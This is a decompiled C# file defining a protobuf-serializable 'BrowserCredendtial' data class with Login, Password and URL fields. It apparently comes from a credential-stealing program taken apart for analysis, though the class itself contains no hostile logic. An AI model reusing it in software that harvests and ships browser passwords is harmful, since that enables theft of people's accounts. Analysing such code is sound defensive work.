using System;
using System.Collections.Generic;
using System.ComponentModel;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x02000160 RID: 352
	[ProtoContract(Name = "BrowserCredendtial")]
	public class BrowserCredendtial : INotifyPropertyChanged, IEqualityComparer<BrowserCredendtial>
	{
		// Token: 0x170002C1 RID: 705
		// (get) Token: 0x06000B38 RID: 2872 RVA: 0x000089F0 File Offset: 0x00006BF0
		// (set) Token: 0x06000B39 RID: 2873 RVA: 0x000089F8 File Offset: 0x00006BF8
		[ProtoMember(1, Name = "Login")]
		public string Login
		{
			get
			{
				return this._login;
			}
			set
			{
				this._login = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Login"));
			}
		}

		// Token: 0x170002C2 RID: 706
		// (get) Token: 0x06000B3A RID: 2874 RVA: 0x00008A1C File Offset: 0x00006C1C
		// (set) Token: 0x06000B3B RID: 2875 RVA: 0x00008A24 File Offset: 0x00006C24
		[ProtoMember(2, Name = "Password")]
		public string Password
		{
			get
			{
				return this._password;
			}
			set
			{
				this._password = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Password"));
			}
		}

		// Token: 0x170002C3 RID: 707
		// (get) Token: 0x06000B3C RID: 2876 RVA: 0x00008A48 File Offset: 0x00006C48
		// (set) Token: 0x06000B3D RID: 2877 RVA: 0x00008A50 File Offset: 0x00006C50
		[ProtoMember(3, Name = "URL")]
		public string URL
		{
			get
			{
				return this._uRL;
			}
			set
			{
				this._uRL = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("URL"));
			}
		}

		// Token: 0x1400001C RID: 28
		// (add) Token: 0x06000B3E RID: 2878 RVA: 0x00022C44 File Offset: 0x00020E44
		// (remove) Token: 0x06000B3F RID: 2879 RVA: 0x00022C7C File Offset: 0x00020E7C
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x06000B40 RID: 2880 RVA: 0x00008A74 File Offset: 0x00006C74
		public bool Equals(BrowserCredendtial x, BrowserCredendtial y)
		{
			return x.Login == y.Login && x.Password == y.Password && x.URL == y.URL;
		}

		// Token: 0x06000B41 RID: 2881 RVA: 0x00022CB4 File Offset: 0x00020EB4
		public int GetHashCode(BrowserCredendtial obj)
		{
			int num = 37;
			num *= 397;
			if (!string.IsNullOrEmpty(obj.Login))
			{
				num += obj.Login.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Password))
			{
				num += obj.Password.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.URL))
			{
				num += obj.URL.GetHashCode();
			}
			return num;
		}

		// Token: 0x0400044E RID: 1102
		private string _login;

		// Token: 0x0400044F RID: 1103
		private string _password;

		// Token: 0x04000450 RID: 1104
		private string _uRL;
	}
}
